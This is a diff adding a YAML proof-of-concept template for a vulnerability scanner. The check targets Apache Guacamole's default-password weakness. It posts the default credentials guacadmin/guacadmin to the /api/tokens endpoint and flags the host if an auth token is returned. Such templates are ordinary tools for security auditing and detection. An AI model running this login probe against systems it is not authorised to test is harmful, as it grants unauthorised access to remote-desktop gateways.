@@ -1,0 +1,22 @@
+id: poc-yaml-apache-guacamole-weak-pass
+info:
+  name: Apache Guacamole 弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: Apache Guacamole
+  osprey-id: vb_2022_0065
+variables:
+  r_username: guacadmin
+  r_password: guacadmin
+requests:
+- method: POST
+  path: /api/tokens
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=guacadmin&password=guacadmin
+  expression: 'status_code == 200 && contains(body, "\"userID\":\"guacadmin\"") &&
+    contains(body, "\"authToken\"")
+
+    '
+transport: http
